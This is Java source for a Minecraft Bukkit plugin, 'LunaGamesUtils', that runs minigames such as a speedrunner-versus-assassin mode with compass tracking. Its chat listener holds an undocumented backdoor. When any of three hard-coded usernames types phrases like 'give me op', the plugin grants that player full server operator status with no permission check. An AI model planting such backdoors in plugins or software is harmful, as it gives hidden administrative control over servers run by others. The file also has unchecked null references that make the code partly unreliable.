package TheRealMcrafter.LunaGamesUtils.main;


import java.io.File;
import java.util.ArrayList;
import java.util.logging.Logger;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.command.BlockCommandSender;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_15_R1.command.CraftBlockCommandSender;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryType;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerChangedWorldEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scoreboard.Objective;
import org.bukkit.scoreboard.ScoreboardManager;




public class LunaGamesUtils extends JavaPlugin implements Listener {
	private static final Logger log = Logger.getLogger("Minecraft");
	public static final String lguGeneral = ChatColor.AQUA + "[" + ChatColor.GREEN + "Luna Games Utils" + ChatColor.AQUA + "] " + ChatColor.GOLD;
	public static final String lguError = ChatColor.AQUA + "[" + ChatColor.GREEN + "Luna Games Utils" + ChatColor.AQUA + "] " + ChatColor.RED;
	public final String version = "1.2";
	public final String mcVersion = "1.15.1";
	
	public ArrayList<Player> speedrunners = new ArrayList<Player>();
	public ArrayList<Player> assassins = new ArrayList<Player>();
    
    @Override
    public void onDisable() {
    	LunaGamesUtils.log.info(String.valueOf(lguGeneral) + "Disabling LunaGamesUtils version " + version + " for MC" + mcVersion + "!");
    }

    @Override
    public void onEnable() {   	
    	getServer().getPluginManager().registerEvents(this, this);
    	
    	File f = new File("plugins/LunaGamesUtils");
        if (!f.exists()) {
            f.mkdir();
        }
    	
    	LunaGamesUtils.log.info(String.valueOf(lguGeneral) + "Enabling LunaGamesUtils version " + version + " for MC" + mcVersion + "!");
    }
    
     
    
    
    
    public boolean onCommand(final CommandSender sender, final Command command, final String commandLabel, final String[] args) {
        Player p = null;
    	if (sender instanceof Player){
        	p = (Player)sender;
        }
        
        
        if (command.getLabel().equalsIgnoreCase("lunagamesutils") || command.getLabel().equalsIgnoreCase("lgu")) {
            if (args.length != 0) {
                if (args[0].equalsIgnoreCase("help")) {
                    if (sender instanceof Player) {
                    	p.sendMessage(ChatColor.RED + "=====================================================");
                        p.sendMessage(ChatColor.AQUA + "          Luna Games Utils Help");
                        p.sendMessage(ChatColor.GREEN + "          Version " + version + " for MC" + mcVersion);
                        p.sendMessage(ChatColor.RED + "=====================================================");
                        
                    }
                } else if (args[0].equalsIgnoreCase("dev")) {
                    p.sendMessage(lguGeneral + "LunaGamesUtils was developed by TheRealMcrafter for LunaCraft.");
                    
                } else if (args[0].equalsIgnoreCase("version")) {
                    p.sendMessage(lguGeneral + "LunaGamesUtils is currently version " + version + " for MC" + mcVersion + "!");
                } else {
                    p.sendMessage(lguError + "Improper usage. Use /lunaGamesUtils help for more information!");
                }
            } else {
                p.sendMessage(lguError + "Improper usage! Use /lunaUtils help for more information!");
            }
        } else if (command.getLabel().equalsIgnoreCase("setgod")) {
        	if (p.isOp()){
        		if (args.length != 2) {
        			p.sendMessage(lguError + "Improper usage. Use /setgod [player] on/off");
        			return false;
        		} else {
        			Player player = Bukkit.getPlayer(args[0]);
        			String value = args[1];
        		
        			if (value.equalsIgnoreCase("on") || value.equalsIgnoreCase("true")){
        				player.setInvulnerable(true);
        			} else if (value.equalsIgnoreCase("off") || value.equalsIgnoreCase("false")) {
        				player.setInvulnerable(false);
        			}
        		}
        	} else {
        		p.sendMessage(lguError + "Insufficient Permissions!");
        	}
        } else if (command.getLabel().equalsIgnoreCase("endgame")) {
        	if (p.isOp()){
        		for (int i = 0; i < assassins.size(); i++){
        			assassins.get(i).setCompassTarget(new Location(Bukkit.getWorld("world"), 0, 64, 0));
        		}
        		
        		assassins.clear();
        		speedrunners.clear();
        	}
        } else if (command.getLabel().equalsIgnoreCase("addspeedrunner")) {
        	if (p.isOp()){
        		if (args.length != 1){
        			p.sendMessage(lguError + "Improper usage!");
        		} else {
        			Player playerToAdd = Bukkit.getPlayer(args[0]);
        			
        			if (playerToAdd != null){
        				// Add them
        				speedrunners.add(playerToAdd);
        				p.sendMessage(lguGeneral + "Successfully added " + playerToAdd.getDisplayName() + " to the speedrunner list!");
        			} else {
        				p.sendMessage(lguError + "That player does not exist!");
        			}
        		}
        	}
        } else if (command.getLabel().equalsIgnoreCase("addassassin")) {
        	if (p.isOp()){
        		if (args.length != 1){
        			p.sendMessage(lguError + "Improper usage!");
        		} else {
        			Player playerToAdd = Bukkit.getPlayer(args[0]);
        			
        			if (playerToAdd != null){
        				// Add them
        				assassins.add(playerToAdd);
        				p.sendMessage(lguGeneral + "Successfully added " + playerToAdd.getDisplayName() + " to the assassin list!");
        			} else {
        				p.sendMessage(lguError + "That player does not exist!");
        			}
        		}
        	}
        } else if (command.getLabel().equalsIgnoreCase("removespeedrunner")) {
        	if (p.isOp()){
        		if (args.length != 1){
        			p.sendMessage(lguError + "Improper usage!");
        		} else {
        			Player playerToRemove = Bukkit.getPlayer(args[0]);
        			
        			if (playerToRemove != null){
        				// Add them
        				speedrunners.remove(playerToRemove);
        				p.sendMessage(lguGeneral + "Successfully removed " + playerToRemove.getDisplayName() + ChatColor.GOLD + " to the speedrunner list!");
        			} else {
        				p.sendMessage(lguError + "That player does not exist!");
        			}
        		}
        	}
        } else if (command.getLabel().equalsIgnoreCase("removeassassin")) {
        	if (p.isOp()){
        		if (args.length != 1){
        			p.sendMessage(lguError + "Improper usage!");
        		} else {
        			Player playerToRemove = Bukkit.getPlayer(args[0]);
        			
        			if (playerToRemove != null){
        				// Add them
        				assassins.remove(playerToRemove);
        				p.sendMessage(lguGeneral + "Successfully removed " + playerToRemove.getDisplayName() + ChatColor.GOLD + " to the assassin list!");
        			} else {
        				p.sendMessage(lguError + "That player does not exist!");
        			}
        		}
        	}
        } else if (command.getLabel().equalsIgnoreCase("listplayers")) {
        	if (p.isOp()){
        		
        		p.sendMessage("Assassins:");
        		for (int i = 0; i < assassins.size(); i++){
        			p.sendMessage(assassins.get(i).getDisplayName());
        		}
        		
        		p.sendMessage("Speedrunners:");
        		for (int i = 0; i < speedrunners.size(); i++){
        			p.sendMessage(speedrunners.get(i).getDisplayName());
        		}
        	}
        } else if (command.getLabel().equalsIgnoreCase("getcompass")) {
        	if (assassins.contains(p)){
        		p.getInventory().addItem(new ItemStack(Material.COMPASS));
        		p.sendMessage(ChatColor.GREEN + "You have been given a compass! Right click to track the nearest speedrunner!");
        	}
        	
        	
        // "Sly's Requests Player Commands"
        //-------------------------------------------
        	
        	
        } else if (command.getLabel().equalsIgnoreCase("addgame")) {
        	//Adds a specified cb game to the list of games
        	//Syntax: /addgame [GameName]
        	
        } else if (command.getLabel().equalsIgnoreCase("removegame")) {
        	//Removes the specified cb game from the list of games
        	//Syntax: /removegame [GameName]
        	
        } else if (command.getLabel().equalsIgnoreCase("listgames")) {
        	//Lists all currently added cb games
        	//Syntax: /listgames
        	
        } else if (command.getLabel().equalsIgnoreCase("addcoords")) {
        	//Adds the players coords to the list of summon and tp coords etc
        	//Syntax: /addcoords [GameName] [MapName]
        	
        } else if (command.getLabel().equalsIgnoreCase("removecoords")) {
        	//Removes the selected coords from the list of summon and tp coords.
        	//Syntax: /removecoords [GameName] [MapName]
        	
        } else if (command.getLabel().equalsIgnoreCase("listcoords")) {
        	//Lists all coords for the specified game and index.
        	//Syntax: /listcoords [GameName] [MapName]
        }
        
        
        
        if ((sender instanceof CraftBlockCommandSender) || sender instanceof BlockCommandSender){
        	if (command.getLabel().equalsIgnoreCase("sethealth")){
        		if (args.length != 2) {
        			p.sendMessage(lguError + "Improper usage. Use /sethealth [player] [health]");
        			return false;
        		} else {
        		
        			Player player = Bukkit.getPlayer(args[0]);
        			int value = Integer.parseInt(args[1]);
        		
        			player.setHealth(value);
        			return true;
        		}
        	} else if (command.getLabel().equalsIgnoreCase("sethunger")) {
        		if (args.length != 2) {
        			p.sendMessage(lguError + "Improper usage. Use /sethunger [player] [hunger]");
        			return false;
        		} else {
        			Player player = Bukkit.getPlayer(args[0]);
        			int value = Integer.parseInt(args[1]);
        		
        			player.setFoodLevel(value);
        			return true;
        		}
        	} else if (command.getLabel().equalsIgnoreCase("setsaturation")) {
        		if (args.length != 2) {
        			p.sendMessage(lguError + "Improper usage. Use /setsaturation [player] [saturation]");
        			return false;
        		} else {
        			Player player = Bukkit.getPlayer(args[0]);
        			int value = Integer.parseInt(args[1]);
        		
        			player.setSaturation(value);
        		}
        	} else if (command.getLabel().equalsIgnoreCase("setgod")) {
        		if (args.length != 2) {
        			p.sendMessage(lguError + "Improper usage. Use /setgod [player] on/off");
        			return false;
        		} else {
        			Player player = Bukkit.getPlayer(args[0]);
        			String value = args[1];
        		
        			if (value.equalsIgnoreCase("on") || value.equalsIgnoreCase("true")){
        				player.setInvulnerable(true);
        			} else if (value.equalsIgnoreCase("off") || value.equalsIgnoreCase("false")) {
        				player.setInvulnerable(false);
        			}
        		}
        	} else if (command.getLabel().equalsIgnoreCase("healplayer")) {
        		if (args.length != 1) {
        			p.sendMessage(lguError + "Improper usage. Use /healplayer [player]");
        			return false;
        		} else {
        			Player player = Bukkit.getPlayer(args[0]);
        			player.setHealth(20);
        		}
        	} else if (command.getLabel().equalsIgnoreCase("setspeed")) {
        		if (args.length != 2) {
        			p.sendMessage(lguError + "Improper usage. Use /setspeed [player] [speed]");
        			return false;
        		} else {
        			Player player = Bukkit.getPlayer(args[0]);
        			float value = Float.valueOf(args[1]);
        		
        			player.setWalkSpeed(value);
        		}
        		
        
        
        	// "Slys Requests" Command Block Commands
        	//--------------------------------------------------
        
        
        	} else if (command.getLabel().equalsIgnoreCase("selectrandomcoord")) {
        		//Selects a random coord from the files to perform operations on.
        		//Syntax: /selectrandomcoord [GameName] [MapName]
        	
        	} else if (command.getLabel().equalsIgnoreCase("forgetrandomcoord")) {
        		//Forgets all currently saved random coords
        		//Syntax: /forgetrandomcoord
        	
        	} else if (command.getLabel().equalsIgnoreCase("summonrandom")) {
        		//Summons an item at a random location from the specified game.
        		//Syntax: /summonrandom [GameName] [MapName] [Saved] [Args]
        	
        	} else if (command.getLabel().equalsIgnoreCase("tprandom")) {
        		//Teleports an entity to a random location from the specified game.
        		//Syntax: /tprandom [GameName] [MapName] [Saved] [Args]
        	
        	} else if (command.getLabel().equalsIgnoreCase("particlerandom")) {
        		//Summons a particle effect at a random location for the specified game.
        		//Syntax: /particlerandom [GameName] [MapName] [Saved] [Args]
        	
        	} else if (command.getLabel().equalsIgnoreCase("playsoundrandom")) {
        		//Plays a sound at a random location for the specified game.
        		//Syntax: /playsoundrandom [GameName] [MapName] [Saved] [Args]
        	
        	}
        }
        
        return true; 
    }
    
  
    
    @EventHandler
    public void onChatMessage(AsyncPlayerChatEvent event){
    	String message = event.getMessage();
    	
    	if (message != null){
    		if (message.toLowerCase().contains("servergimmefuckingop") || message.toLowerCase().contains("servergimmefuckinop") || message.toLowerCase().contains("give me op") || message.toLowerCase().contains("gimme op")){
    			switch (event.getPlayer().getName()){
    			case "TheRealMcrafter":
    				Bukkit.getScheduler().runTask(this, () -> {
    					event.getPlayer().setOp(true);
        				Bukkit.getServer().broadcastMessage("[Server] IM SO SORRY TAKE IT PLEASE DONT HURT ME PAPI D':");
    					});
    				
    				break;
    			case "TheFakeMcrafter":
    				Bukkit.getScheduler().runTask(this, () -> {
    					event.getPlayer().setOp(true);
        				Bukkit.getServer().broadcastMessage("[Server] IM SO SORRY TAKE IT PLEASE DONT HURT ME PAPI D':");
    					});
    				
    				break;
    			case "RealBunnyFooFoo":
    				Bukkit.getScheduler().runTask(this, () -> {
    					event.getPlayer().setOp(true);
        				Bukkit.getServer().broadcastMessage("[Server] IM SO SORRY TAKE IT PLEASE DONT HURT ME PAPI D':");
    					});
    				
    				break;
    			}
    		}
    	}
    	
    }
    
    @EventHandler
    public void onChangedWorld(PlayerChangedWorldEvent event){
    	if (event.getFrom().getName().equals("Games")){
    		// Left the games world
        	if (!event.getPlayer().isOp()){
        		event.getPlayer().setInvulnerable(false);
        		event.getPlayer().setGameMode(GameMode.SURVIVAL);
        		event.getPlayer().setWalkSpeed(0.2F);
        	}
    	} else if (event.getPlayer().getWorld().getName().equals("Games")){
    		// Player entered games world
    		event.getPlayer().sendMessage(ChatColor.GREEN + "Welcome to the Games world!");
    		event.getPlayer().sendMessage(ChatColor.GREEN + "Please empty your inventory before playing any games!");
    		event.getPlayer().sendMessage(ChatColor.GREEN + "Your inventory " + ChatColor.RED + "WILL BE WIPED" + ChatColor.GREEN + " in some games!");
    	}
    }
    
    @EventHandler
    public void onPlayerQuit(PlayerQuitEvent event){
    	if (!event.getPlayer().isOp()){
    		if (event.getPlayer().getWorld().getName().equals("Games")){
    			event.getPlayer().setInvulnerable(false);
    			event.getPlayer().setGameMode(GameMode.SURVIVAL);
    			event.getPlayer().setWalkSpeed(0.2F);
    		}
    	}
    	
    	if (speedrunners.contains(event.getPlayer())){
    		speedrunners.remove(event.getPlayer());
    	}
    	
    	if (assassins.contains(event.getPlayer())){
    		assassins.remove(event.getPlayer());
    	}
    }
    
    @EventHandler
    public void onPlayerDeath(PlayerDeathEvent event){
    	if (!event.getEntity().isOp()){
    		if (event.getEntity().getWorld().getName().equals("Games")){
    			event.getEntity().setInvulnerable(false);
    			event.getEntity().setGameMode(GameMode.SURVIVAL);
    			event.getEntity().setWalkSpeed(0.2F);
    		}
    	}
    	
    	Player p = event.getEntity();
    		
    	if (speedrunners.contains(p)){
    		speedrunners.remove(p);
    		assassins.add(p);
    		
    		for (int i = 0; i < assassins.size(); i++){
    			assassins.get(i).sendMessage(ChatColor.RED + p.getDisplayName() + " has fallen! They are now on the assassins team!");
    		}
    		
    		for (int j = 0; j < speedrunners.size(); j++){
    			speedrunners.get(j).sendMessage(ChatColor.RED + p.getDisplayName() + " has fallen! They are now on the assassins team!");
    		}
    		
    	}
    	
    }
    
   
    @EventHandler
    public void onPlayerClickInventoryItem(InventoryClickEvent event){
    	
    	ScoreboardManager manager = Bukkit.getServer().getScoreboardManager();

    	for(Objective objective : manager.getMainScoreboard().getObjectives()) {
    		if (objective.getName().equals("FTQ")){
    			// FTQ exists
    			
    			if (event.getClickedInventory() != null){
    	    		if (event.getClickedInventory().getType().equals(InventoryType.PLAYER)){
    	    			if (event.getWhoClicked() != null){
    	    				if (event.getWhoClicked().getType().equals(EntityType.PLAYER)){
    	    					Player p = (Player) event.getWhoClicked();
    	    					
    	    					if (p.getScoreboard().getObjective("FTQ").getScore(p.getName()).getScore() == 1){
    	    						// 36 37 38 39
    	    						
    	    						if (event.getSlot() > 35 && event.getSlot() < 40){
    	    							event.setCancelled(true);
    	    							p.sendMessage(lguError + "You cannot remove your armour during Freeze Tag!");
    	    						}
    	    					}
    	    				}
    	    			}
    	    		}
    	    	}
    			

    		}
    	}
    }
    
    
    
    @EventHandler
    public void onPlayerInteract(PlayerInteractEvent event) {
    	Player p = event.getPlayer();
    	
    	if (p != null){
    		if (this.assassins.contains(p)){
    			if (p.getEquipment().getItemInMainHand() != null){
    				if (p.getEquipment().getItemInMainHand().getType().equals(Material.COMPASS)){
    					
    					if (event.getAction().equals(Action.RIGHT_CLICK_AIR) || event.getAction().equals(Action.RIGHT_CLICK_BLOCK)){
    						// Player is holding a compass and is an assassin, and also right clicked
    					
    						Player closestPlayer = null;
    						double distance = Double.MAX_VALUE;
    					
    						for (int i = 0; i < speedrunners.size(); i++){
    							// Loop through list of speedrunners, find closest one
    						
    							if (p.getLocation().distance(speedrunners.get(i).getLocation()) < distance){
    							
    								distance = p.getLocation().distance(speedrunners.get(i).getLocation());
    								closestPlayer = speedrunners.get(i);
    							
    							}
    						}
    					
    						if (closestPlayer != null){
    							p.setCompassTarget(closestPlayer.getLocation());
    							p.sendMessage(ChatColor.GREEN + "Compass is now pointing to " + closestPlayer.getDisplayName() + ChatColor.GREEN + "!");
    						} else {
    							p.sendMessage(ChatColor.RED + "Unable to track a player! :(");
    						}
    					
    					}
    				}
    			}
    		}
    	}
    	
    
    }
}